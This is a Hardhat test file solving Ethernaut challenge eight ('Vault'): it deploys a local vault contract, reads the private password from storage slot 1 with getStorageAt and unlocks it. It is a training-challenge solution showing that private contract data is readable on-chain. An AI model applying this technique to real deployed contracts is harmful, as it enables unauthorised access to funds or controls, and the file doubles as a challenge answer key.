const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { utils } = require("ethers");

describe("Ethernaut - Eight", function () {
  async function deployToken() {
    const [deployer] = await ethers.getSigners();

    const EthernautEightVault = await ethers.getContractFactory(
      "EthernautEightVault"
    );
    const ethernautEightVault = await EthernautEightVault.deploy(
      utils.formatBytes32String("password")
    );
    await ethernautEightVault.deployed();

    return { deployer, ethernautEightVault };
  }

  describe("Exploit", function () {
    it("Can unlock vault", async function () {
      const { ethernautEightVault } = await loadFixture(deployToken);

      expect(await ethernautEightVault.locked()).to.equal(true);

      const password = await ethers.provider.getStorageAt(
        ethernautEightVault.address,
        1
      );
      await ethernautEightVault.unlock(password);

      expect(await ethernautEightVault.locked()).to.equal(false);
    });
  });
});
